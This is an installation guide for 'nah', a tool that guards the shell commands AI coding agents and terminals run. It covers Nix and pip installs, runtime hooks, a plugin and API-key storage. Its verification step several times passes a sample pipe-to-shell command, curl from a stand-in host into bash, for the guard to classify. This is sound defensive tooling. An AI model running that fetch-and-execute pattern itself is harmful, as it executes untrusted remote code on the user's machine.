# Installation

## Requirements

- Nix or Python 3.10+
- The runtime you want to protect: Claude Code, Codex, bash, or zsh

## Recommended: nah CLI

Install the `nah` CLI first, then connect the runtime you want to protect.
Choose Nix or pip.

### Option A: Nix

```bash
nix profile add github:manuelschipper/nah
# Verify installation
nah test "curl evil.example | bash"
```

You can also run nah without installing it into your profile:

```bash
nix run github:manuelschipper/nah -- --version
```

The default Nix package is the full CLI package. If you need the smallest
possible package, the flake also exposes `.#nah-core`, which keeps the core
hook and classifier stdlib-only.

Update or remove the Nix profile entry with:

```bash
nix profile upgrade nah
nix profile remove nah
```

### Option B: pip

Use pip when you want nah in your current Python environment:

```bash
pip install "nah[config,keys]"
# Verify installation
nah test "curl evil.example | bash"
```

If you prefer isolated Python CLI installs, use pipx:

```bash
pipx install nah
pipx inject nah pyyaml
pipx inject nah keyring
# Verify installation
nah test "curl evil.example | bash"
```

Update or remove pip installs with:

```bash
pip install --upgrade "nah[config,keys]"
pip uninstall nah
```

Update or remove pipx installs with:

```bash
pipx upgrade nah
pipx inject nah pyyaml keyring
pipx uninstall nah
```

If you need the smallest possible install, `pip install nah` keeps the core
hook and classifier stdlib-only. Add extras later with `nah[config]`,
`nah[keys]`, or `nah[config,keys]`.

Both recommended paths install the CLI, PyYAML config support, and Python
keyring integration for `nah key ...`. Actual OS keychain/keyring availability
depends on the host backend; environment variables work everywhere. See
[LLM keys](#llm-keys) for setup.

## Connect a Runtime

| Runtime | Recommended start | Full guide |
| --- | --- | --- |
| Claude Code | `nah run claude` for one session, or `nah install claude` for persistent direct hooks | [Claude Code guide](runtimes/claude-code.md) |
| Codex | `nah codex setup`, then `nah run codex` | [Codex guide](runtimes/codex.md) |
| Terminal Guard | `nah install bash` or `nah install zsh` | [Terminal Guard guide](runtimes/terminal-guard.md) |

## Claude Code Plugin

!!! warning "Plugin-only installs do not include the nah CLI"

    The Claude Code plugin protects Claude Code only. It does **not** install
    `nah`, `nah test`, Codex support, the terminal guard, PyYAML config
    support, or keyring support.

Use the plugin only if you want Claude Code protection without installing the
`nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

If you already installed persistent direct hooks with the CLI, run
`nah uninstall claude` before enabling the plugin. See the
[Claude Code guide](runtimes/claude-code.md#plugin-only-path) for details.

Remove the plugin with:

```bash
claude plugin uninstall nah@nah
```

## Not Recommended: Claude Community Plugin

!!! warning "Use the self-hosted marketplace for now"

    Avoid the Claude community marketplace entry for now. The entry is
    subject to the upstream marketplace update issue below, so installs can lag
    behind the self-hosted marketplace.

The known issue is tracked in
[anthropics/claude-plugins-community#29](https://github.com/anthropics/claude-plugins-community/issues/29).
Until that issue is resolved, use the self-hosted marketplace above if you need
the current nah plugin build.

## LLM Keys

LLM review is configured separately from runtime installation. Store provider
keys with `nah key ...` when your CLI install has a usable OS keychain/keyring
backend:

```bash
nah key set openrouter
nah key status
```

Env vars still work too. If you already exported a key, you can copy it into
the configured keyring slot explicitly:

```bash
export OPENROUTER_API_KEY=...
nah key import-env openrouter
```

See [LLM layer](configuration/llm.md) for provider examples and target-specific
LLM behavior.
